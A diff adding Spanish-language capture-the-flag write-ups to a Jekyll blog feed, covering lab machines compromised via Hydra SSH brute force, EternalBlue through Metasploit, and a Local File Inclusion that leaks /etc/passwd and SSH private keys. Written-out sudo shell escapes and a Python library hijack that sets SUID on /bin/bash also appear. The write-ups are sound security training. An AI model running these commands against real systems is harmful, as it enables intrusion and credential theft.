+      <td><code class="language-plaintext highlighter-rouge">hydra</code></td>
+      <td>Herramienta de fuerza bruta rápida y flexible, usada para romper contraseñas en servicios remotos.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-l mario</code></td>
+      <td>Nombre de <strong>usuario fijo</strong> que se va a probar (<code class="language-plaintext highlighter-rouge">mario</code>).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-P /usr/share/wordlists/rockyou.txt</code></td>
+      <td>Ruta al <strong>diccionario de contraseñas</strong>. Se probarán todas esas contraseñas con el usuario <code class="language-plaintext highlighter-rouge">mario</code>.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">ssh://172.18.0.2</code></td>
+      <td>Protocolo y <strong>dirección IP del objetivo</strong>, en este caso SSH. Hydra sabrá que debe conectarse al puerto 22 por defecto.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Se encontró una posible contraseña <strong>chocolate</strong> que pertenece al usuario <strong>mario</strong></p>
+
+<p><img src="image-9.png" alt="alt text" /></p>
+
+<p>Ahora que tenemos un usuario y una contraseña probaremos mediante el puerto de conexión 22 SSH estas credenciales.</p>
+
+<p>Estamos dentro de la maquina como el usuario <strong>mario</strong>. Ahora revisaremos para ver si existe algo de interés para apoderarnos de la maquina.</p>
+
+<p><img src="image-10.png" alt="alt text" /></p>
+
+<p>Probamos el comando <code class="language-plaintext highlighter-rouge">sudo -l</code></p>
+
+<h3 id="-qué-hace">🧩 ¿Qué hace?</h3>
+
+<p>🔍 <strong>Muestra los comandos que el usuario actual puede ejecutar con <code class="language-plaintext highlighter-rouge">sudo</code> sin necesidad de contraseña</strong> (o con su contraseña, si ya la ingresó antes).</p>
+
+<p>Podemos ver que el usuario <strong>mario</strong>  puede ejecutar <strong>vim</strong>.</p>
+
+<p><img src="image-11.png" alt="alt text" /></p>
+
+<p>Buscamos en la pagina https://gtfobins.github.io/gtfobins/vim/ y nos dice que con <strong>vim</strong> podemos salir de una shell restringida.
+Para ello abriremos vim en la maquina victima y pondremos el siguiente código:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim -c ':!/bin/sh'
+</code></pre></div></div>
+
+<p>somos <strong>root</strong> nos hemos apoderado totalmente de la maquina.</p>
+
+<p><img src="image-12.png" alt="alt text" /></p>]]></content><author><name>Mauricio López</name><email>your-email@email.com</email></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[Vamos a trabajar con una máquina de Dockerlabs en la que aprenderemos a utilizar la herramienta Hydra para realizar un ataque de fuerza bruta sobre el servicio SSH, con el objetivo de comprometer y tomar control de la máquina víctima.]]></summary></entry><entry><title type="html">Maquina Zero</title><link href="http://localhost:4000/maquina-zero/" rel="alternate" type="text/html" title="Maquina Zero" /><published>2025-04-22T16:00:00+00:00</published><updated>2025-04-22T16:00:00+00:00</updated><id>http://localhost:4000/maquina-zero</id><content type="html" xml:base="http://localhost:4000/maquina-zero/"><![CDATA[<p>Iniciaremos usando la herramienta <strong>netdiscover</strong> para hacer un escaneo a nuestra red y poder identificar la IP de la maquina victima. Identificamos que es la IP <strong>192.168.56.102</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo netdiscover -r 192.168.56.101/24
+
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+ -----------------------------------------------------------------------------
+ 192.168.56.1    0a:00:27:00:00:2f      1      60  Unknown vendor
+ 192.168.56.100  08:00:27:f4:63:40      1      60  PCS Systemtechnik GmbH
+ 192.168.56.102  08:00:27:09:1f:2e      1      60  PCS Systemtechnik GmbH
+</code></pre></div></div>
+
+<p>Ahora usaremos la herramienta <strong>Nmap</strong> para ver los puertos, servicios y versiones que este contenga. Podemos ver que el sistema operativo de la maquina victima es <strong>Windows</strong> y tiene muchos puertos abiertos donde llama la atención el puerto <strong>445</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ sudo nmap -p- -sS -sC -sV --open --min-rate=5000 -vvv -n -Pn 192.168.56.102
+
+PORT      STATE SERVICE      REASON          VERSION
+53/tcp    open  domain       syn-ack ttl 128 Simple DNS Plus
+88/tcp    open  kerberos-sec syn-ack ttl 128 Microsoft Windows Kerberos (server time: 2024-09-16 05:19:10Z)
+135/tcp   open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
+139/tcp   open  netbios-ssn  syn-ack ttl 128 Microsoft Windows netbios-ssn
+389/tcp   open  ldap         syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds syn-ack ttl 128 Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: ZERO)
+464/tcp   open  kpasswd5?    syn-ack ttl 128
+593/tcp   open  ncacn_http   syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped   syn-ack ttl 128
+3268/tcp  open  ldap         syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped   syn-ack ttl 128
+5985/tcp  open  http         syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       syn-ack ttl 128 .NET Message Framing
+49666/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
+49667/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
+49669/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
+49670/tcp open  ncacn_http   syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
+49684/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
+49703/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
+MAC Address: 08:00:27:09:1F:2E (Oracle VirtualBox virtual NIC)
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-time:
+|   date: 2024-09-16T05:19:58
+|_  start_date: 2024-09-16T05:10:39
+| nbstat: NetBIOS name: DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:09:1f:2e (Oracle VirtualBox virtual NIC)
+| Names:
+|   ZERO&lt;1c&gt;             Flags: &lt;group&gt;&lt;active&gt;
+|   DC01&lt;00&gt;             Flags: &lt;unique&gt;&lt;active&gt;
+|   ZERO&lt;00&gt;             Flags: &lt;group&gt;&lt;active&gt;
+|   DC01&lt;20&gt;             Flags: &lt;unique&gt;&lt;active&gt;
+|   ZERO&lt;1b&gt;             Flags: &lt;unique&gt;&lt;active&gt;
+| Statistics:
+|   08:00:27:09:1f:2e:00:00:00:00:00:00:00:00:00:00:00
+|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_clock-skew: mean: 6h19m57s, deviation: 4h02m29s, median: 3h59m57s
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: DC01
+|   NetBIOS computer name: DC01\x00
+|   Domain name: zero.hmv
+|   Forest name: zero.hmv
+|   FQDN: DC01.zero.hmv
+|_  System time: 2024-09-15T22:19:58-07:00
+| p2p-conficker:
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 50063/tcp): CLEAN (Timeout)
+|   Check 2 (port 23011/tcp): CLEAN (Timeout)
+|   Check 3 (port 34474/udp): CLEAN (Timeout)
+|   Check 4 (port 8826/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 22:20
+Completed NSE at 22:20, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 22:20
+Completed NSE at 22:20, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 22:20
+Completed NSE at 22:20, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 120.71 seconds
+           Raw packets sent: 131065 (5.767MB) | Rcvd: 33 (1.436KB)
+</code></pre></div></div>
+
+<p>Haremos un escaneo con <strong>Nmap</strong> al puerto 445 y nos dice que es vulnerable al <strong>ms17-010</strong> “eternalblue”.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>─$ sudo nmap --script "vuln and safe" -p445 192.168.56.102
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-15 22:31 -03
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.56.102
+Host is up (0.00059s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 08:00:27:09:1F:2E (Oracle VirtualBox virtual NIC)
+
+Host script results:
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+
+Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
+
+</code></pre></div></div>
+
+<p>Procedemos a usar la herramienta <strong>metasploit</strong> para poder vulnerar la maquina victima.
+<img src="image.png" alt="alt text" /></p>
+
+<p>Buscamos la vulnerabilidad “eternalblue” con el comando
+<strong>“search eternalblue”</strong>
+<img src="image-1.png" alt="alt text" /></p>
+
+<p>Nos saldrá una lista de exploits. Escogemos el exploit numero 10 que lleva de nombre <strong>“exploit/windows/smb/ms17_010_psexec”</strong> lo seleccionamos con el comando <strong>“use 10”</strong>
+<img src="image-2.png" alt="alt text" /></p>
+
+<p>Este payload afecta el protocolo SMB (Server Message Block) y permite la ejecución remota de código.</p>
+
+<h1 id="como-funciona"><span style="color: #f39c12; font-weight: bold;">¿Como funciona?</span></h1>
+
+<p>Este exploit aprovecha una falla conocida como MS17-010, que afecta el protocolo SMBv1 en Windows. Básicamente, este protocolo tiene un error que permite a un atacante ejecutar código en una máquina sin necesidad de autenticarse, siempre y cuando el sistema no haya sido actualizado con el parche de seguridad correspondiente.</p>
+
+<p>Una vez que se explota la vulnerabilidad, se utiliza una técnica llamada <strong>PsExec</strong>, que es una herramienta de administración remota para ejecutar comandos en la máquina víctima. Esto se hace a través del mismo protocolo SMB y permite ejecutar comandos con privilegios administrativos. El módulo de Metasploit que usa este exploit combina ambas cosas: primero, explota la vulnerabilidad MS17-010 y, luego, usa PsExec para ejecutar comandos de forma remota en el sistema comprometido.
+Ya configurado el payload que se usara para el ataque procedemos a configurar los demás parámetros.</p>
+
+<p>Donde se nos pide lo siguiente:</p>
+
+<ul>
+  <li>RHOST: IP de la maquina victima.</li>
+  <li>LHOST: IP de la maquina atacante.</li>
+  <li>LPORT: puerto que usaremos para realizar el ataque.</li>
+</ul>
+
+<p>Una vez ya configurado los parámetros podemos lanzar el exploit.</p>
+
+<p><img src="image-3.png" alt="alt text" /></p>
+
+<p>Ya dentro de la maquina victima empezamos a buscar las 2 flags del examen.
+Navegando entre archivos y directorios encontramos la primera flag en un archivo llamado <strong>root.txt</strong></p>
+
+<p><img src="image-4.png" alt="alt text" /></p>
+
+<p>Encontramos la segunda flag en un archivo llamado <strong>user.txt</strong></p>
+
+<p><img src="image-5.png" alt="alt text" /></p>
+
+<p>Ya con los objetivos encontrados damos por finalizado la maquina Zero</p>]]></content><author><name>Mauricio López</name><email>your-email@email.com</email></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[Iniciaremos usando la herramienta netdiscover para hacer un escaneo a nuestra red y poder identificar la IP de la maquina victima. Identificamos que es la IP 192.168.56.102]]></summary></entry><entry><title type="html">Maquina Psycho</title><link href="http://localhost:4000/maquina-Psycho/" rel="alternate" type="text/html" title="Maquina Psycho" /><published>2025-04-22T16:00:00+00:00</published><updated>2025-04-22T16:00:00+00:00</updated><id>http://localhost:4000/maquina-Psycho</id><content type="html" xml:base="http://localhost:4000/maquina-Psycho/"><![CDATA[<p>En esta práctica trabajaremos con una máquina de DockerLabs en la que explotaremos una vulnerabilidad de <em>Local File Inclusion (LFI)</em>. Gracias a esta falla obtendremos diferentes ventajas que nos permitirán avanzar en el proceso de explotación y, finalmente, apoderarnos de la máquina víctima.</p>
+
+<p><img src="image.png" alt="alt text" /></p>
+
+<p>Empezaremos haciendo un escaneo de puertos a la maquina <strong>Psycho</strong> con la herramienta <strong>Nmap</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> sudo nmap -p- --open -sSCV --min-rate 5000 -Pn -n -v 172.17.0.2 -oN escaneo
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parte</th>
+      <th>Significado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">sudo</code></td>
+      <td>Se necesita privilegios de administrador para algunos tipos de escaneo (como los de tipo SYN).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">nmap</code></td>
+      <td>Herramienta para escaneo de redes y puertos.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-p-</code></td>
+      <td>Escanea <strong>todos los puertos</strong> (del 1 al 65535).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--open</code></td>
+      <td>Muestra <strong>solo los puertos abiertos</strong>, omite los cerrados y filtrados.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-sSCV</code></td>
+      <td>Combinación de opciones:  <br />• <code class="language-plaintext highlighter-rouge">-sS</code> = Escaneo <strong>SYN</strong> (rápido y sigiloso).  <br />• <code class="language-plaintext highlighter-rouge">-sC</code> = Usa <strong>scripts NSE básicos</strong>, equivalente a <code class="language-plaintext highlighter-rouge">--script=default</code>.  <br />• <code class="language-plaintext highlighter-rouge">-sV</code> = Detecta versiones de servicios.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--min-rate 5000</code></td>
+      <td>Intenta enviar <strong>al menos 5000 paquetes por segundo</strong> (muy rápido). ⚠️ Puede generar falsos positivos si la red no lo soporta bien.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-Pn</code></td>
+      <td>No hace <strong>ping previo</strong> al host (asume que está vivo). Útil si ICMP está bloqueado.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-n</code></td>
+      <td>No resuelve nombres DNS (más rápido).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-v</code></td>
+      <td>Modo <strong>verborreico</strong>: muestra más detalles durante el escaneo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">172.17.0.2</code></td>
+      <td>IP del objetivo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-oN escaneo</code></td>
+      <td>Guarda el resultado en un archivo llamado <code class="language-plaintext highlighter-rouge">escaneo</code> en formato <strong>legible para humanos</strong> (normal output).</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>El escaneo nos muestra que esta maquina tiene 2 puerto abierto.</p>
+
+<ul>
+  <li>puerto 22 ssh version 9.6</li>
+  <li>puerto 80 http</li>
+</ul>
+
+<p><img src="image-1.png" alt="alt text" /></p>
+
+<p>Revisaremos el puerto 80 para ver que pagina esta corriendo por detrás.
+Vemos una pagina sencilla que hace alusión a un CTF . Revisamos el código fuente sin encontrar nada raro. En la pagina sale el nombre de <strong>TLuisillo_o</strong> tanto en el hero como el footer, esto podría ser un posible usuario.
+La pagina tiene 2 botones que no funcionan. uno en el nabvar y otro en el centro de la pagina hero.</p>
+
+<p><img src="image-2.png" alt="alt text" /></p>
+
+<p>También podemos ver que abajo sale un mensaje de error. Esto puede ser que se esta tratando tener acceso a algún archivo mal configurado.</p>
+
+<p><img src="image-3.png" alt="alt text" /></p>
+
+<p><img src="image-4.png" alt="alt text" /></p>
+
+<p>Usaremos la herramienta gobuster para ver si se encuentran directorios ocultos. Para ello usaremos el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,sh
+</code></pre></div></div>
+
+<p>Se encontraron algunos directorios.</p>
+
+<p><img src="image-5.png" alt="alt text" /></p>
+
+<p>Al revisar nos encontramos con un menú de apache donde hay una ruta que lleva a una imagen.</p>
+
+<p><img src="image-6.png" alt="alt text" /></p>
+
+<p>Al parecer es la imagen de fondo de la pagina encontrada en el puerto 80. Revise la imagen con la herramienta <strong>exiftool</strong> para ver si contenía algún dato oculto pero no conseguí nada.</p>
+
+<p><img src="image-7.png" alt="alt text" /></p>
+
+<p>Usare la herramienta <strong>wfuzz</strong> para ver si esta pagina es vulnerable a LFI (Local File Inclusión) ya que anteriormente se encontró en la pagina específicamente en el <strong>footer</strong> un mensaje de <strong>error</strong> por lo cual al parecer este intentando de llamar algún recurso de forma incorrecta. Usaremos el directorio que encontró <strong>index.php</strong> para ver si se trata de un LFI
+Para ello usaremos el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt 'http://172.17.0.2/index.php?FUZZ=../../../../../../../../../../etc/passwd'
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Componente</th>
+      <th>Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">wfuzz</code></td>
+      <td>La herramienta para fuzzing web</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-c</code></td>
+      <td>Colorea la salida para mejor visualización en terminal</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</code></td>
+      <td>Diccionario que contiene miles de nombres de archivos/directorios/comunes. En este caso, se está usando para probar <strong>nombres de parámetros HTTP</strong></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">'http://172.17.0.2/index.php?FUZZ=../../../../../../../../../../etc/passwd'</code></td>
+      <td>Este es el objetivo de fuzzing. La palabra clave <strong><code class="language-plaintext highlighter-rouge">FUZZ</code></strong> será reemplazada por cada palabra del diccionario</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Al parecer nos arroja demasiada información por lo cual filtraremos un poco para que solo nos muestre cuando haya encontrado algo. Aplicaremos un filtro por lineas. por lo tanto el comando seria el siguiente</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hl=62 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt 'http://172.17.0.2/index.php?FUZZ=../../../../../../../../../../etc/passwd'
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Opción</th>
+      <th>Significado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">wfuzz</code></td>
+      <td>Herramienta de fuzzing para aplicaciones web</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-c</code></td>
+      <td>Muestra la salida con colores (para mayor claridad visual)</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--hl=62</code></td>
+      <td><strong>Oculta respuestas que tienen exactamente 62 líneas</strong></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-w /usr/share/...txt</code></td>
+      <td>Lista de palabras (payloads) que van a reemplazar <code class="language-plaintext highlighter-rouge">FUZZ</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">'http://172.17.0.2/index.php?FUZZ=../../.../etc/passwd'</code></td>
+      <td>URL de prueba, donde <code class="language-plaintext highlighter-rouge">FUZZ</code> será reemplazado por cada palabra del diccionario</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="image-8.png" alt="alt text" /></p>
+
+<p>Encontró una coincidencia <strong>secret</strong>. Ahora veremos si funciona. Para ello usaremos la herramienta <strong>curl</strong>. Usaremos el siguiente comando</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl 'http://172.17.0.2/index.php?secret=../../../../../../../../../../etc/passwd'
+</code></pre></div></div>
+
+<h2 id="qué-hace-exactamente">¿Qué hace exactamente?</h2>
+
+<p>Este comando está intentando <strong>leer el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code></strong> del sistema remoto usando una vulnerabilidad <strong>LFI</strong> a través del parámetro <code class="language-plaintext highlighter-rouge">secret</code> en el archivo <code class="language-plaintext highlighter-rouge">index.php</code>.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parte</th>
+      <th>Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">curl</code></td>
+      <td>Herramienta de línea de comandos para hacer peticiones HTTP</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">'http://172.17.0.2/index.php?secret=...'</code></td>
+      <td>La URL del servidor objetivo, con un parámetro GET llamado <code class="language-plaintext highlighter-rouge">secret</code> que probablemente esté siendo usado en el backend por <code class="language-plaintext highlighter-rouge">index.php</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">../../../../../../../../../../etc/passwd</code></td>
+      <td>Ruta relativa para intentar salir del directorio actual y alcanzar el archivo sensible del sistema operativo <code class="language-plaintext highlighter-rouge">/etc/passwd</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="image-9.png" alt="alt text" /></p>
+
+<p>Tuvimos éxito. Ahora podemos ver 2 posibles usuarios <strong>vaxei</strong> y <strong>luisillo</strong> que posiblemente el segundo usuario sea el mismo <strong>TLuisillo</strong> de la pagina web.
+Intente usar <strong>hydra</strong> en los 2 usuarios encontrados para ver si encontraba alguna credencial para poder acceder por el puerto 22 ssh pero no se encontró nada.</p>
+
+<p><img src="image-10.png" alt="alt text" /></p>
+
+<p>Otra alternativa que podemos hacer es encontrar los archivos <strong>id_rsa</strong> de los 2 usuarios, aprovechando la vulnerabilidad LFI.</p>
+
+<h2 id="qué-es-id_rsa">¿Qué es <code class="language-plaintext highlighter-rouge">id_rsa</code>?</h2>
+
+<p><code class="language-plaintext highlighter-rouge">id_rsa</code> es la <strong>clave privada RSA</strong> utilizada para autenticarse en sistemas a través de <strong>SSH (Secure Shell)</strong>.</p>
+
+<p>Por defecto, se encuentra en:</p>
+
+<p><code class="language-plaintext highlighter-rouge">/home/&lt;usuario&gt;/.ssh/id_rsa</code></p>
+
+<p>Y su correspondiente clave pública está en:</p>
+
+<p><code class="language-plaintext highlighter-rouge">/home/&lt;usuario&gt;/.ssh/id_rsa</code></p>
+
+<h2 id="para-qué-sirve">¿Para qué sirve?</h2>
+
+<ul>
+  <li>
+    <p>La clave privada <code class="language-plaintext highlighter-rouge">id_rsa</code> permite iniciar sesión <strong>sin necesidad de contraseña</strong>, si el sistema remoto tiene la <strong>clave pública</strong> en su archivo <code class="language-plaintext highlighter-rouge">~/.ssh/authorized_keys</code>.</p>
+  </li>
+  <li>
+    <p>Es como tener <strong>la llave de una casa</strong>. Si obtienes <code class="language-plaintext highlighter-rouge">id_rsa</code> de un usuario y puedes usarla, puedes conectarte por SSH como ese usuario.</p>
+  </li>
+</ul>
+
+<p>Para ello pondremos el siguiente comando:</p>
+
+<p><strong>lusillo</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>view-source:http://172.17.0.2/index.php?secret=../../../../../../../../../../home/luisillo/.ssh/id_rsa
+</code></pre></div></div>
+
+<p><strong>vaxei</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>view-source:http://172.17.0.2/index.php?secret=../../../../../../../../../../home/vaxei/.ssh/id_rsa
+</code></pre></div></div>
+
+<p>Tuvimos exito con el usuario <strong>vaxei</strong></p>
+
+<p><img src="image-11.png" alt="alt text" /></p>
+
+<p>Ahora queda abrir <strong>nano</strong> pegar esta <strong>id_rsa</strong> y darle permiso 600 para poder entrar por ssh.</p>
+
+<p><img src="image-12.png" alt="alt text" /></p>
+
+<p>Aplicamos el comando <code class="language-plaintext highlighter-rouge">sudo -l</code> para ver binarios vulnerables. Encontramos que podemos vulnerar con <strong>perl</strong> con el usuario <strong>luisillo</strong>.
+Consultando la pagina https://gtfobins.github.io/gtfobins/perl/#sudo nos da el comando para aprovechar esta vulnerabilidad.</p>
+
+<p>Lo adaptamos un poco</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -u luisillo perl -e 'exec "/bin/bash"';'
+</code></pre></div></div>
+
+<p><img src="image-13.png" alt="alt text" /></p>
+
+<p>Hemos entrado al sistema como el usuario <strong>luisillo</strong>.</p>
+
+<p><img src="image-14.png" alt="alt text" /></p>
+
+<p>Aplicamos un <code class="language-plaintext highlighter-rouge">sudo -l</code> y nos dice que el usuario <strong>luisillo</strong> es capaz de ejecutar como root en python el script <strong>paw.py</strong></p>
+
+<p><img src="image-15.png" alt="alt text" /></p>
+
+<p>Vamos a la ubicación del archivo y ejecutamos el script. Nos da un error ya que esta intentando ejecutar otro script llamado <strong>subprocess.py</strong> pero este no existe. podríamos crear este script</p>
+
+<p><img src="image-16.png" alt="alt text" /></p>
+
+<p>Entonces crearemos un archivo llamado subprocess.py en el mismo directorio donde se encuentra el otro script paw.py. Abrimos con nano el script y agregamos lo siguiente.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import os;
+os.system("chmod u+s /bin/bash")
+</code></pre></div></div>
+
+<p>Guardamos el archivo y luego ejecutamos el archivo <strong>paw.py</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -u root /usr/bin/python3 /opt/paw.py
+</code></pre></div></div>
+
+<p>y por ultimo ponemos el siguiente comando</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -p
+</code></pre></div></div>
+
+<p>Con esto seremos <strong>root</strong></p>
+
+<p><img src="image-17.png" alt="alt text" /></p>]]></content><author><name>Mauricio López</name><email>your-email@email.com</email></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[En esta práctica trabajaremos con una máquina de DockerLabs en la que explotaremos una vulnerabilidad de Local File Inclusion (LFI). Gracias a esta falla obtendremos diferentes ventajas que nos permitirán avanzar en el proceso de explotación y, finalmente, apoderarnos de la máquina víctima.]]></summary></entry><entry><title type="html">Maquina Obsession</title><link href="http://localhost:4000/maquina-Obsession/" rel="alternate" type="text/html" title="Maquina Obsession" /><published>2025-04-22T16:00:00+00:00</published><updated>2025-04-22T16:00:00+00:00</updated><id>http://localhost:4000/maquina-Obsession</id><content type="html" xml:base="http://localhost:4000/maquina-Obsession/"><![CDATA[<p>En esta práctica trabajaremos con una máquina de DockerLabs donde aprovecharemos el servicio FTP abierto en el puerto 21 para acceder a la cuenta <em>anonymous</em>. Desde allí descargaremos documentos y archivos sensibles que nos proporcionarán pistas relevantes para avanzar en la explotación y vulneración de la máquina.</p>
+
+<p><img src="image-1.png" alt="alt text" /></p>
+
+<p>Empezaremos haciendo un escaneo de puertos a la maquina <strong>Obsession</strong> con la herramienta <strong>Nmap</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> sudo nmap -p- --open -sSCV --min-rate 5000 -Pn -n -v 172.17.0.2 -oN escaneo
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parte</th>
+      <th>Significado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">sudo</code></td>
+      <td>Se necesita privilegios de administrador para algunos tipos de escaneo (como los de tipo SYN).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">nmap</code></td>
+      <td>Herramienta para escaneo de redes y puertos.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-p-</code></td>
+      <td>Escanea <strong>todos los puertos</strong> (del 1 al 65535).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--open</code></td>
+      <td>Muestra <strong>solo los puertos abiertos</strong>, omite los cerrados y filtrados.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-sSCV</code></td>
